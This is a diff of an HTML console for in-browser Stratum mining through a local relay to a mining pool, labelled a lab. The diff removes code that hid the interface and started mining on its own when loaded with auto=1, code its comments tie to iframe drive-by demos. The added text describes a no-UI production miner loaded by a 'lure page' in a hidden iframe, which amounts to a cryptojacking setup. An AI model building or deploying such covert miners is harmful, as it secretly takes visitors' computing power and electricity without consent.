@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Stratum HTTP 中继演示</title>
+  <title>Stratum HTTP relay (lab)</title>
   <style>
     :root {
       --bg: #0f1419;
@@ -61,56 +61,51 @@
     .err { color: #e85d5d; font-size: 0.9rem; margin-top: 0.5rem; }
     code { font-size: 0.88em; }
     ul { margin: 0.5rem 0 0; padding-left: 1.2rem; color: var(--muted); font-size: 0.88rem; }
-    /* URL 参数 auto=1 时隐藏说明区，便于 iframe 内低调加载 */
-    body.auto-mining > .sub,
-    body.auto-mining .panel-intro,
-    body.auto-mining .panel-hint {
-      display: none !important;
-    }
-    body.auto-mining h1 { font-size: 1rem; margin-bottom: 0.5rem; }
   </style>
 </head>
 <body>
-  <h1>HTTP 中继（浏览器 → relay-server → 矿池）</h1>
+  <h1>HTTP relay (browser → relay-server → pool)</h1>
   <p class="sub">
-    本页通过 <code>GET /api/job</code>、<code>POST /api/submit</code> 与本机 <code>relay-server.js</code> 通信；矿池账号与 Stratum TCP 仅在 Node 进程内。请勿用 <code>file://</code> 打开，需本地 HTTP 服务。
-    开始挖矿后会<strong>自动</strong>定时向中继拉取最新任务（矿池下发新块/新难度时与 relay 保持一致），一般不必手动反复点「拉取任务状态」；仅在未开始挖矿时可用它先看是否就绪。
+    This page is a <strong>lab console</strong>: you can change the relay URL and workers manually.
+    The production-like, no-UI version is <code>miner.html</code> (config in <code>miner-config.js</code>).
+    The lure page <code>embed-lab.html</code> embeds <code>miner.html</code> in a hidden iframe.
+    After mining starts, jobs sync with the relay periodically; use <strong>Fetch job</strong> first to see if a job is ready.
   </p>
 
-  <div class="panel panel-intro">
-    <p style="margin:0 0 0.5rem;font-size:0.9rem;color:var(--text)"><strong>如何打开本页</strong></p>
+  <div class="panel">
+    <p style="margin:0 0 0.5rem;font-size:0.9rem;color:var(--text)"><strong>How to open</strong></p>
     <ul>
-      <li>在 <code>mining-demo</code> 的<strong>上一级目录</strong>执行：<code>python -m http.server 8080 --bind 127.0.0.1</code></li>
-      <li>浏览器访问：<code>http://127.0.0.1:8080/mining-demo/index.html</code></li>
+      <li>From the <strong>parent</strong> of <code>mining-demo</code>, run: <code>python -m http.server 8080 --bind 127.0.0.1</code></li>
+      <li>Open: <code>http://127.0.0.1:8080/mining-demo/index.html</code></li>
     </ul>
   </div>
 
   <div class="panel">
-    <label for="relayBase">中继 HTTP 根地址</label>
+    <label for="relayBase">Relay HTTP base URL</label>
     <input type="text" id="relayBase" value="http://127.0.0.1:3001" autocomplete="off" />
 
-    <label for="workers" style="margin-top:0.75rem">Worker 数量（1–4）</label>
+    <label for="workers" style="margin-top:0.75rem">Workers (1–4)</label>
     <input type="number" id="workers" min="1" max="4" value="1" />
-    <label for="throttle" style="margin-top:0.75rem">负载限制（1–10）</label>
+    <label for="throttle" style="margin-top:0.75rem">Throttle (1–10)</label>
     <input type="number" id="throttle" min="1" max="10" value="1" />
 
     <div class="row">
-      <button type="button" id="btnPoll" class="btn-muted">拉取任务状态</button>
-      <button type="button" id="btnStart">开始挖矿</button>
-      <button type="button" id="btnStop" disabled>停止</button>
+      <button type="button" id="btnPoll" class="btn-muted">Fetch job</button>
+      <button type="button" id="btnStart">Start mining</button>
+      <button type="button" id="btnStop" disabled>Stop</button>
     </div>
-    <p class="stats" id="jobStatus">任务：未拉取</p>
+    <p class="stats" id="jobStatus">Job: not fetched</p>
     <div class="stats" id="live">
-      合计算力：<strong id="hashrate">0 H/s</strong> · 有效 share：<strong id="shareCount">0</strong>
+      Hash rate: <strong id="hashrate">0 H/s</strong> · Valid shares: <strong id="shareCount">0</strong>
     </div>
     <p class="err" id="err" hidden></p>
   </div>
 
-  <div class="panel panel-hint">
+  <div class="panel">
     <p style="margin:0;font-size:0.88rem;color:var(--muted)">
-      <strong>启动 relay（另开终端，账号改为你的）</strong>：<br />
-      <code>node relay-server.js -H stratum.braiins.com -p 3333 -u 子账户.矿工 --pass x</code><br />
-      或使用 <code>npm run relay -- -H stratum.braiins.com -u 子账户.矿工</code>（<code>--</code> 后面接参数）。<code>node relay-server.js --help</code> 查看全部选项。
+      <strong>Start relay (separate terminal; use your pool account)</strong>:<br />
+      <code>node relay-server.js -H stratum.braiins.com -p 3333 -u subaccount.worker --pass x</code><br />
+      Or <code>npm run relay -- -H stratum.braiins.com -u subaccount.worker</code> (arguments after <code>--</code>). <code>node relay-server.js --help</code> for all options.
     </p>
   </div>
 
@@ -137,7 +132,6 @@
     };
     let stratumMiningActive = false;
     let autoSubmit = true;
-    /** 当前 Worker 正在用的任务签名（jobId + 难度 + ntime），用于检测矿池是否换新任务 */
     let lastWorkerJobKey = "";
     let jobPollTimer = null;
     const JOB_POLL_MS = 20000;
@@ -188,7 +182,6 @@
       }
     }
 
-    /** 挖矿过程中定时调用：中继上的任务若与当前 Worker 不一致则重启 Worker */
     async function pollJobWhileMining() {
       if (!stratumMiningActive) return;
       try {
@@ -216,14 +209,14 @@
       const r = await fetch(base + "/api/job", { method: "GET" });
       const j = await r.json();
       if (!j.ready) {
-        jobStatus.textContent = "任务：" + (j.message || "未就绪");
+        jobStatus.textContent = "Job: " + (j.message || "not ready");
         return false;
       }
       stratumState.difficulty = j.difficulty || 1;
       stratumState.extranonce1 = j.extranonce1 != null ? j.extranonce1 : "";
       stratumState.extranonce2Size = j.extranonce2Size | 0;
       stratumState.job = j.job;
-      jobStatus.textContent = "任务：就绪 job_id=" + j.job.jobId + " difficulty=" + stratumState.difficulty;
+      jobStatus.textContent = "Job: ready job_id=" + j.job.jobId + " difficulty=" + stratumState.difficulty;
       return true;
     }
 
@@ -261,13 +254,13 @@
 
     function startStratumWorkersOnly(count, throttle) {
       const size = stratumState.extranonce2Size | 0;
-      if (size < 1 || size > 32) throw new Error("extranonce2_size 无效");
+      if (size < 1 || size > 32) throw new Error("extranonce2_size invalid");
       const j = stratumState.job;
       for (let i = 0; i < count; i++) {
         const w = new Worker(workerScriptUrl);
         w.onmessage = handleMinerMessage;
         w.onerror = function () {
-          showErr("Worker 加载失败，请用 HTTP 打开本页");
+          showErr("Worker failed to load (open this page over HTTP, not file://).");
         };
         w.postMessage({
           cmd: "startStratum",
@@ -275,6 +268,8 @@
           numWorkers: count,
           throttle: throttle,
           difficulty: stratumState.difficulty || 1,
+          nonceSegmentIndex: 0,
+          nonceSegmentCount: 1,
           job: {
             jobId: j.jobId,
             prevhash: j.prevhash,
@@ -301,12 +296,11 @@
       }
     });
 
-    /** @returns {Promise<boolean>} 是否已成功开始 */
     async function startMining() {
       showErr("");
       const ok = await fetchJob();
       if (!ok || !jobReady()) {
-        showErr("中继尚无任务：请确认 relay-server 已连上矿池并出现 mining.notify，再点「拉取任务状态」。");
+        showErr("No job yet: ensure relay-server is running and the pool has sent mining.notify, then click Fetch job.");
         return false;
       }
       pool.forEach(function (w) {
@@ -338,54 +332,6 @@
     btnStart.addEventListener("click", function () {
       startMining();
     });
-
-    /**
-     * 轮询直到中继有任务再自动开始（iframe / 挂马演示用）
-     * @param {number} maxAttempts 每次间隔约 2s，默认约 2 分钟
-     */
-    async function waitForJobAndAutoStart(maxAttempts, intervalMs) {
-      maxAttempts = maxAttempts == null ? 60 : maxAttempts;
-      intervalMs = intervalMs == null ? 2000 : intervalMs;
-      jobStatus.textContent = "任务：等待中继与矿池（自动挖矿）…";
-      for (let a = 0; a < maxAttempts; a++) {
-        try {
-          const ok = await fetchJob();
-          if (ok && jobReady()) {
-            await startMining();
-            return true;
-          }
-        } catch (_) {}
-        await new Promise(function (r) {
-          setTimeout(r, intervalMs);
-        });
-      }
-      showErr(
-        "自动挖矿：等待中继任务超时。请确认已运行 relay-server 且矿池已下发 mining.notify。"
-      );
-      return false;
-    }
-
-    (function applyUrlParams() {
-      const p = new URLSearchParams(location.search);
-      if (p.get("relay")) relayBase.value = p.get("relay");
-      if (p.get("workers")) {
-        const w = parseInt(p.get("workers"), 10);
-        if (w >= 1 && w <= 4) workersEl.value = String(w);
-      }
-      if (p.get("throttle")) {
-        const t = parseInt(p.get("throttle"), 10);
-        if (t >= 1 && t <= 10) throttleEl.value = String(t);
-      }
-      const auto = p.get("auto") === "1" || p.get("auto") === "true";
-      if (auto) {
-        document.body.classList.add("auto-mining");
-        document.title = "Stratum（自动）";
-        waitForJobAndAutoStart(
-          p.get("waitAttempts") ? parseInt(p.get("waitAttempts"), 10) : 60,
-          p.get("waitMs") ? parseInt(p.get("waitMs"), 10) : 2000
-        );
-      }
-    })();
 
     btnStop.addEventListener("click", function () {
       stopJobPoll();
